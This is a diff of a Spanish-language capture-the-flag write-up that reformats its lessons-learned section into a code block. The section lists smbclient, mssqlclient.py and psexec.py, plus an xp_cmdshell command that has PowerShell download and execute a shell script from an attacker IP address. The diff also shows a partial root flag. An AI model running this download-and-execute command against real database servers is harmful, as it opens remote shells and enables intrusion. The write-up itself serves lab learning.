@@ -295,10 +295,11 @@ Procedemos a sacar la flag del administrador o root.txt
 b91ccec3305e98240082d4474b------    "
 ```
 APRENDIDO:
-
->> Uso de las herramientas:
->> smbclient
->> mssqlclient.py
->> psexec.py
->> Forma de injeccion de comandos despues de setear la configuracion de la opcion xp_cmdshell en Mysql
->> COMMANDO xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.16.54/shell.ps1\");"
+```bash
+ Uso de las herramientas:
+ "smbclient    "
+ "mssqlclient.py   "
+ "psexec.py   "
+ "Forma de injeccion de comandos despues de setear la configuracion de la opcion xp_cmdshell en Mysql     "
+ "COMMANDO xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.5/shell.ps1\");"   "
+```
